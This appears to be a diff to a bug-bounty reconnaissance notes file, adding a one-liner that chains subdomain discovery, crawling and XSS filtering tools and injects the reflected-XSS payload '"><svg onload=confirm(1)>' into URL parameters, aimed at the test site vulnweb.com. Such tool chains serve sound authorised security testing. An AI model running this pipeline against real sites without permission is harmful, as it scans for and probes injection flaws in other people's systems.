@@ -633,9 +633,7 @@ c templates concurrent
   29 - gf patterns ==> git clone https://github.com/1ndianl33t/Gf-Patterns
             mkdir .gf
             mv ~/Gf-Patterns/*.json ~/.gf
-  29- katana -d 10 -list httpxfile -silent  | gf xss 
-   
-       
+  29- echo http://vulnweb.com | subfinder -silent | httpx -silent | katana -d 10 -silent | gf xss | Gxss -c 100 -p XssReflected | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
        
        
        
